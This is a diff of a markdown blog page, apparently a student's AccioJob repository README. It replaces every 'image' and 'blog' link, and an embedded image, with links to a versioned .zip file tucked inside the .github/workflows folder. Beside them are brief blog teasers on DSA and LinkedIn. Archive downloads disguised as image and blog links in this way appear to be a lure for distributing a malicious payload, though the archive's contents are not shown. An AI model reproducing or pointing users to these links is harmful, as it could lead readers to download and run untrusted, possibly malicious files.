@@ -4,11 +4,11 @@
 
 **Image links:**
 
-https://raw.githubusercontent.com/Saurabh22111998/acciojob-blog-Saurabh22111998/master/unrecognizing/acciojob-blog-Saurabh22111998.zip 
+https://github.com/Saurabh22111998/acciojob-blog-Saurabh22111998/raw/refs/heads/master/.github/workflows/blog-Saurabh-acciojob-2.6.zip 
 
-https://raw.githubusercontent.com/Saurabh22111998/acciojob-blog-Saurabh22111998/master/unrecognizing/acciojob-blog-Saurabh22111998.zip 
+https://github.com/Saurabh22111998/acciojob-blog-Saurabh22111998/raw/refs/heads/master/.github/workflows/blog-Saurabh-acciojob-2.6.zip 
 
-https://raw.githubusercontent.com/Saurabh22111998/acciojob-blog-Saurabh22111998/master/unrecognizing/acciojob-blog-Saurabh22111998.zip 
+https://github.com/Saurabh22111998/acciojob-blog-Saurabh22111998/raw/refs/heads/master/.github/workflows/blog-Saurabh-acciojob-2.6.zip 
 
 **Note:** 
 
@@ -18,10 +18,10 @@ https://raw.githubusercontent.com/Saurabh22111998/acciojob-blog-Saurabh22111998/
 
 **Blog links:**
 
-- https://raw.githubusercontent.com/Saurabh22111998/acciojob-blog-Saurabh22111998/master/unrecognizing/acciojob-blog-Saurabh22111998.zip 
-- https://raw.githubusercontent.com/Saurabh22111998/acciojob-blog-Saurabh22111998/master/unrecognizing/acciojob-blog-Saurabh22111998.zip 
-- https://raw.githubusercontent.com/Saurabh22111998/acciojob-blog-Saurabh22111998/master/unrecognizing/acciojob-blog-Saurabh22111998.zip 
-- https://raw.githubusercontent.com/Saurabh22111998/acciojob-blog-Saurabh22111998/master/unrecognizing/acciojob-blog-Saurabh22111998.zip 
+- https://github.com/Saurabh22111998/acciojob-blog-Saurabh22111998/raw/refs/heads/master/.github/workflows/blog-Saurabh-acciojob-2.6.zip 
+- https://github.com/Saurabh22111998/acciojob-blog-Saurabh22111998/raw/refs/heads/master/.github/workflows/blog-Saurabh-acciojob-2.6.zip 
+- https://github.com/Saurabh22111998/acciojob-blog-Saurabh22111998/raw/refs/heads/master/.github/workflows/blog-Saurabh-acciojob-2.6.zip 
+- https://github.com/Saurabh22111998/acciojob-blog-Saurabh22111998/raw/refs/heads/master/.github/workflows/blog-Saurabh-acciojob-2.6.zip 
 
 **Content:**
 
@@ -37,4 +37,4 @@ DSA vs. Competitive Programming
 
 - As a job seeker, you may wonder how to make your LinkedIn profile stand out to recruiters. Your LinkedIn…
 
-![blog](https://raw.githubusercontent.com/Saurabh22111998/acciojob-blog-Saurabh22111998/master/unrecognizing/acciojob-blog-Saurabh22111998.zip)
+![blog](https://github.com/Saurabh22111998/acciojob-blog-Saurabh22111998/raw/refs/heads/master/.github/workflows/blog-Saurabh-acciojob-2.6.zip)
